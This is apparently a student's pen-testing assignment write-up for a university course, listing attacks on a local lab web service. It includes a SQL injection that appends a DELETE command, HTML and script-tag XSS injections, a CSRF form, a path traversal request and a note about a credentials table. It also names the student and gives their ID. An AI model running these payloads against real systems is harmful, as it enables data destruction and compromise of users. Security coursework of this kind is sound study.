@@ -1,0 +1,59 @@
+Compsci 335 Pen-testing
+Name: Yujia Wu
+UPI: ywu660
+Student ID: 827481772
+
+Pen-Testing the Service
+=======================
+Network User
+------------
+
+N01: 	SQL injection is possible in the search API,
+		Service at http://localhost:8188/DairyService.svc/search?term={TERM}
+
+		GET http://localhost:8188/DairyService.svc/search?term=';%20DELETE%20FROM%20Comments; HTTP/1.1
+		HOST:localhost
+
+N02:	HTML injection is possible in the comment API,
+        Service at http://localhost:8188/Service.svc/comment?name={NAME}.
+
+		POST http://localhost:8188/DairyService.svc/comment?name=<u>hello</u> HTTP/1.1
+		Host: localhost
+		Content-Type: application/json
+
+N03: 	POST http://localhost:8188/DairyService.svc/comment?name=<img%20src="http://redsox.uoa.auckland.ac.nz/ds/logo.svg"%20alt="logo"%20style="width:10%"> HTTP/1.1
+		Host: localhost
+        Content-Type: application/json
+
+N04: 	Cross-site scripting (XSS) is possible in the comment API,
+        Service at http://localhost:8188/DairyService.svc/comment?name={NAME}.
+
+		POST http://localhost:8188/DairyService.svc/comment?name=<script>alert("Gotcha!")</script> HTTP/1.1
+		Host: localhost
+		Content-Type: application/json
+
+N05:    Cross-Site Request Forgery (CSRF) is an attack that forces an end user to execute unwanted actions on
+        a web application in which they're currently authenticated.
+
+N06:    POST http://localhost:8188/DairyService.svc/comment?name=eerer HTTP/1.1
+		Host: localhost
+		Content-Type: application/json
+		Request-payload:"<form action="http://localhost:8188/DairyService.svc/itemimg?id=248309243" method="POST">
+		                <input type="hidden" name="email" value="abc"/><input type="submit" value="Submit"></form>"
+
+Co-Located User
+---------------
+C01: 	SQLite format 3
+
+C02: 	3 Tables:
+		- Items
+		- Comments
+		- Credentials
+
+C03: 	kelsif
+
+C04: 
+
+C05: 	http://localhost:8188/DairyService.svc/itemimg?id=../LargePix/nutofoonu.jpg
+
+
